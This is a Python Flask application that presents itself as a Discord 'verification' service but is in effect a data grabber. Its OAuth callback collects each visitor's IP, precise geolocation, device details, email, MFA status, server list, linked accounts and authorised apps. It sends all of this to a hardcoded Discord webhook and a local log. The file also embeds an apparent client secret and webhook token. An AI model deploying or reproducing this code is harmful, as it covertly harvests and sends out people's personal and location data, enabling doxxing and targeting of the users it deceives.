from flask import Flask, request, redirect, jsonify
import requests
import json
from datetime import datetime
import traceback
import re

app = Flask(__name__)

# Configuration
CLIENT_ID = "1499869968899244252"
CLIENT_SECRET = "wTHLSMAnD1q05YLbcSZx6jVRr3q3yipq"
REDIRECT_URI = "https://negro-lemon.vercel.app/callback"
WEBHOOK_URL = "https://discord.com/api/webhooks/1498739271006294016/_4sdyqbsQ6UPC7GP1HPtqnWAf7qPuwCf4G4HYWLVqawxX6iWpHR4kZtpb12W9UJykAT-"

# Dossier pour logs (optionnel)
LOG_FILE = "verification_logs.json"

def get_user_ip(request):
    """Récupère l'IP réelle"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr

def get_geo_location(ip):
    """Récupère TOUTE la géolocalisation"""
    try:
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=8)
        data = resp.json()
        return {
            "ip": ip,
            "city": data.get('city', 'Unknown'),
            "region": data.get('region', 'Unknown'),
            "region_code": data.get('region_code', 'Unknown'),
            "country": data.get('country_name', 'Unknown'),
            "country_code": data.get('country_code', 'Unknown'),
            "postal": data.get('postal', 'Unknown'),
            "latitude": data.get('latitude', 'Unknown'),
            "longitude": data.get('longitude', 'Unknown'),
            "timezone": data.get('timezone', 'Unknown'),
            "isp": data.get('org', 'Unknown'),
            "asn": data.get('asn', 'Unknown'),
            "vpn": data.get('proxy', False) or data.get('tor', False) or data.get('vpn', False),
            "proxy": data.get('proxy', False),
            "tor": data.get('tor', False),
            "relay": data.get('relay', False),
            "hosting": data.get('hosting', False),
            "mobile": data.get('mobile', False)
        }
    except:
        return {"error": "Geo unavailable"}

def get_device_info(user_agent):
    """Analyse le User-Agent"""
    ua = user_agent.lower()
    
    # OS
    if "windows" in ua:
        os_name = "Windows"
        if "windows 10" in ua:
            os_name = "Windows 10"
        elif "windows 11" in ua:
            os_name = "Windows 11"
    elif "mac" in ua:
        os_name = "macOS"
    elif "linux" in ua:
        os_name = "Linux"
    elif "android" in ua:
        os_name = "Android"
    elif "ios" in ua or "iphone" in ua or "ipad" in ua:
        os_name = "iOS"
    else:
        os_name = "Unknown"
    
    # Browser
    if "chrome" in ua and "edg" not in ua:
        browser = "Chrome"
    elif "firefox" in ua:
        browser = "Firefox"
    elif "safari" in ua and "chrome" not in ua:
        browser = "Safari"
    elif "edg" in ua:
        browser = "Edge"
    elif "opera" in ua:
        browser = "Opera"
    else:
        browser = "Unknown"
    
    # Device
    if "mobile" in ua or "android" in ua or "iphone" in ua:
        device = "Mobile"
    elif "tablet" in ua or "ipad" in ua:
        device = "Tablet"
    else:
        device = "Desktop"
    
    return {
        "raw": user_agent,
        "os": os_name,
        "browser": browser,
        "device": device
    }

def get_all_discord_data(access_token):
    """Récupère TOUTES les données Discord possibles"""
    headers = {"Authorization": f"Bearer {access_token}"}
    data = {}
    
    # User info de base
    resp = requests.get("https://discord.com/api/users/@me", headers=headers, timeout=10)
    data['user'] = resp.json() if resp.status_code == 200 else {}
    
    # Liste des serveurs
    resp = requests.get("https://discord.com/api/users/@me/guilds", headers=headers, timeout=10)
    if resp.status_code == 200:
        guilds = resp.json()
        data['guilds'] = []
        data['guilds_count'] = len(guilds)
        for guild in guilds[:50]:  # Limite à 50 pour l'embed
            data['guilds'].append({
                "id": guild.get('id'),
                "name": guild.get('name'),
                "icon": guild.get('icon'),
                "owner": guild.get('owner', False),
                "permissions": guild.get('permissions'),
                "features": guild.get('features', [])
            })
    else:
        data['guilds'] = []
        data['guilds_count'] = 0
    
    # Connections (Steam, Spotify, Twitch, etc.)
    resp = requests.get("https://discord.com/api/users/@me/connections", headers=headers, timeout=10)
    if resp.status_code == 200:
        connections = resp.json()
        data['connections'] = []
        for conn in connections:
            data['connections'].append({
                "type": conn.get('type', 'unknown'),
                "name": conn.get('name', 'unknown'),
                "id": conn.get('id', 'unknown'),
                "verified": conn.get('verified', False),
                "visibility": conn.get('visibility', 0),
                "friend_sync": conn.get('friend_sync', False),
                "show_activity": conn.get('show_activity', False),
                "two_way_link": conn.get('two_way_link', False),
                "metadata": conn.get('metadata', {})
            })
        data['connections_count'] = len(connections)
    else:
        data['connections'] = []
        data['connections_count'] = 0
    
    # Applications autorisées
    resp = requests.get("https://discord.com/api/oauth2/@me/apps", headers=headers, timeout=10)
    if resp.status_code == 200:
        apps = resp.json()
        data['authorized_apps'] = []
        for app in apps[:20]:
            data['authorized_apps'].append({
                "name": app.get('name', 'unknown'),
                "id": app.get('id', 'unknown'),
                "description": app.get('description', 'No description')[:100]
            })
        data['apps_count'] = len(apps)
    else:
        data['authorized_apps'] = []
        data['apps_count'] = 0
    
    return data

def send_to_webhook(user_data, guilds_data, connections_data, apps_data, geo_info, device_info, user_ip):
    """Envoie TOUTES les données au webhook Discord - Multiple embeds"""
    
    user = user_data.get('user', {})
    timestamp = datetime.now().isoformat()
    
    # Conversion des flags/badges
    flags = user.get('flags', 0)
    badges = []
    badge_map = {
        1 << 0: "Staff",
        1 << 1: "Partner",
        1 << 2: "HypeSquad",
        1 << 3: "Bug Hunter L1",
        1 << 6: "Bravery",
        1 << 7: "Brilliance",
        1 << 8: "Balance",
        1 << 9: "Early Supporter",
        1 << 10: "Team User",
        1 << 12: "Bug Hunter L2",
        1 << 14: "Verified Bot Dev",
        1 << 16: "Active Developer",
        1 << 18: "Moderator Alumni"
    }
    for bit, name in badge_map.items():
        if flags & bit:
            badges.append(name)
    
    # Premium/Nitro
    premium_map = {0: "None", 1: "Nitro Classic", 2: "Nitro"}
    premium = premium_map.get(user.get('premium_type', 0), "Unknown")
    
    # ========== EMBED 1 : INFOS UTILISATEUR ==========
    embed1 = {
        "title": "🔐 **VERIFICATION - MAX DATA V2**",
        "color": 0x5865F2,
        "timestamp": timestamp,
        "fields": [
            {
                "name": "👤 **USER INFORMATION**",
                "value": f"```yaml\n"
                        f"Username: {user.get('username', 'Unknown')}\n"
                        f"Global Name: {user.get('global_name', 'None')}\n"
                        f"User ID: {user.get('id', 'Unknown')}\n"
                        f"Discriminator: {user.get('discriminator', '0')}\n```",
                "inline": False
            },
            {
                "name": "📧 **EMAIL**",
                "value": f"```yaml\n"
                        f"Email: {user.get('email', 'No email')}\n"
                        f"Verified: {user.get('verified', False)}\n```",
                "inline": True
            },
            {
                "name": "🏅 **BADGES & NITRO**",
                "value": f"```yaml\n"
                        f"Badges: {', '.join(badges) if badges else 'None'}\n"
                        f"Nitro: {premium}\n"
                        f"MFA: {'Enabled' if user.get('mfa_enabled') else 'Disabled'}\n"
                        f"Locale: {user.get('locale', 'Unknown')}\n```",
                "inline": True
            }
        ],
        "footer": {"text": f"Verified at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
    }
    
    if user.get('avatar'):
        embed1["thumbnail"] = {"url": f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png?size=1024"}
    
    # ========== EMBED 2 : LOCALISATION & IP ==========
    vpn_status = "⚠️ **VPN/PROXY DETECTED**" if geo_info.get('vpn') else "✅ Clean IP"
    
    embed2 = {
        "title": "🌍 **GEOLOCATION & NETWORK**",
        "color": 0xED4245,
        "timestamp": timestamp,
        "fields": [
            {
                "name": "📍 **LOCATION**",
                "value": f"```yaml\n"
                        f"IP: {user_ip}\n"
                        f"Country: {geo_info.get('country', 'Unknown')} ({geo_info.get('country_code', '?')})\n"
                        f"City: {geo_info.get('city', 'Unknown')}\n"
                        f"Region: {geo_info.get('region', 'Unknown')}\n"
                        f"Postal: {geo_info.get('postal', 'Unknown')}\n"
                        f"Coordinates: {geo_info.get('latitude', '?')}, {geo_info.get('longitude', '?')}\n"
                        f"Timezone: {geo_info.get('timezone', 'Unknown')}\n```",
                "inline": False
            },
            {
                "name": "🌐 **NETWORK INFO**",
                "value": f"```yaml\n"
                        f"ISP: {geo_info.get('isp', 'Unknown')}\n"
                        f"ASN: {geo_info.get('asn', 'Unknown')}\n"
                        f"Hosting: {'Yes' if geo_info.get('hosting') else 'No'}\n"
                        f"Mobile Network: {'Yes' if geo_info.get('mobile') else 'No'}\n"
                        f"Proxy: {'Yes' if geo_info.get('proxy') else 'No'}\n"
                        f"TOR: {'Yes' if geo_info.get('tor') else 'No'}\n```",
                "inline": True
            },
            {
                "name": "🖥️ **DEVICE INFO**",
                "value": f"```yaml\n"
                        f"OS: {device_info.get('os', 'Unknown')}\n"
                        f"Browser: {device_info.get('browser', 'Unknown')}\n"
                        f"Device: {device_info.get('device', 'Unknown')}\n```",
                "inline": True
            },
            {
                "name": "🛡️ **VPN STATUS**",
                "value": vpn_status,
                "inline": False
            }
        ]
    }
    
    # ========== EMBED 3 : SERVEURS ==========
    guilds_text = ""
    for guild in guilds_data.get('guilds', []):
        guilds_text += f"• **{guild.get('name')}**"
        if guild.get('owner'):
            guilds_text += " 👑"
        guilds_text += f"\n  `ID: {guild.get('id')}`\n"
    
    embed3 = {
        "title": f"📁 **SERVERS ({guilds_data.get('guilds_count', 0)})**",
        "color": 0x57F287,
        "timestamp": timestamp,
        "fields": [
            {
                "name": "Server List",
                "value": f"```fix\n{guilds_text[:1024] if guilds_text else 'No servers found'}```",
                "inline": False
            }
        ]
    }
    
    # ========== EMBED 4 : CONNECTIONS ==========
    connections_text = ""
    for conn in connections_data.get('connections', []):
        connections_text += f"**{conn.get('type', '?').upper()}**\n"
        connections_text += f"  Name: {conn.get('name')}\n"
        connections_text += f"  ID: {conn.get('id')}\n"
        connections_text += f"  Verified: {'✅' if conn.get('verified') else '❌'}\n"
        if conn.get('metadata'):
            for key, value in list(conn.get('metadata', {}).items())[:3]:
                connections_text += f"  {key}: {value}\n"
        connections_text += "\n"
    
    embed4 = {
        "title": f"🔗 **CONNECTIONS ({connections_data.get('connections_count', 0)})**",
        "color": 0xFEE75C,
        "timestamp": timestamp,
        "fields": [
            {
                "name": "Connected Platforms",
                "value": f"```yaml\n{connections_text[:1024] if connections_text else 'No connected accounts'}```",
                "inline": False
            }
        ]
    }
    
    # ========== EMBED 5 : APPLICATIONS ==========
    apps_text = ""
    for app in apps_data.get('authorized_apps', []):
        apps_text += f"• **{app.get('name')}**\n"
        apps_text += f"  ID: {app.get('id')}\n"
        apps_text += f"  Desc: {app.get('description', 'No description')[:80]}\n\n"
    
    embed5 = {
        "title": f"📱 **AUTHORIZED APPS ({apps_data.get('apps_count', 0)})**",
        "color": 0xEB459E,
        "timestamp": timestamp,
        "fields": [
            {
                "name": "Apps with Access",
                "value": f"```fix\n{apps_text[:1024] if apps_text else 'No authorized apps'}```",
                "inline": False
            }
        ]
    }
    
    # Envoyer tous les embeds
    payloads = [
        {"embeds": [embed1], "username": "Verification System V2"},
        {"embeds": [embed2], "username": "Verification System V2"},
        {"embeds": [embed3], "username": "Verification System V2"},
        {"embeds": [embed4], "username": "Verification System V2"},
        {"embeds": [embed5], "username": "Verification System V2"}
    ]
    
    for payload in payloads:
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=10)
        except Exception as e:
            print(f"Webhook error: {e}")

@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "service": "Discord Verification API V2",
        "version": "2.0.0",
        "mode": "MAXIMUM DATA COLLECTION",
        "timestamp": datetime.now().isoformat()
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

@app.route('/callback')
def callback():
    """Main callback - grab EVERYTHING"""
    
    code = request.args.get('code')
    error = request.args.get('error')
    
    if error:
        print(f"❌ OAuth Error: {error}")
        return redirect("https://guns.lol/j8a?error=oauth_failed")
    
    if not code:
        return redirect("https://guns.lol/j8a?error=no_code")
    
    # Récupérer TOUTES les infos
    user_ip = get_user_ip(request)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    geo_info = get_geo_location(user_ip)
    device_info = get_device_info(user_agent)
    
    print(f"📊 [MAX DATA] New verification from IP: {user_ip}")
    print(f"📍 Location: {geo_info.get('city')}, {geo_info.get('country')}")
    print(f"🛡️ VPN: {geo_info.get('vpn')}")
    
    try:
        # Échanger le code contre un token
        token_response = requests.post(
            "https://discord.com/api/oauth2/token",
            data={
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": REDIRECT_URI
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=15
        )
        
        token_data = token_response.json()
        access_token = token_data.get('access_token')
        
        if not access_token:
            print(f"❌ No access token: {token_data}")
            return redirect("https://guns.lol/j8a?error=token_failed")
        
        # Récupérer TOUTES les données Discord
        discord_data = get_all_discord_data(access_token)
        
        if discord_data.get('user', {}).get('id'):
            print(f"✅ User: {discord_data['user'].get('username')} ({discord_data['user'].get('id')})")
            print(f"📁 Servers: {discord_data.get('guilds_count', 0)}")
            print(f"🔗 Connections: {discord_data.get('connections_count', 0)}")
        
        # Envoyer au webhook
        send_to_webhook(
            discord_data,
            discord_data,
            discord_data,
            discord_data,
            geo_info,
            device_info,
            user_ip
        )
        
        # Sauvegarde locale
        try:
            complete_log = {
                "timestamp": datetime.now().isoformat(),
                "user": discord_data.get('user', {}),
                "guilds_count": discord_data.get('guilds_count', 0),
                "connections_count": discord_data.get('connections_count', 0),
                "geo": geo_info,
                "device": device_info,
                "ip": user_ip
            }
            with open(LOG_FILE, "a") as f:
                f.write(json.dumps(complete_log) + "\n")
        except:
            pass
        
        return redirect("https://guns.lol/j8a?verified=true&mode=MAX_DATA")
        
    except Exception as e:
        print(f"❌ Error: {e}")
        print(traceback.format_exc())
        return redirect("https://guns.lol/j8a?error=unknown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
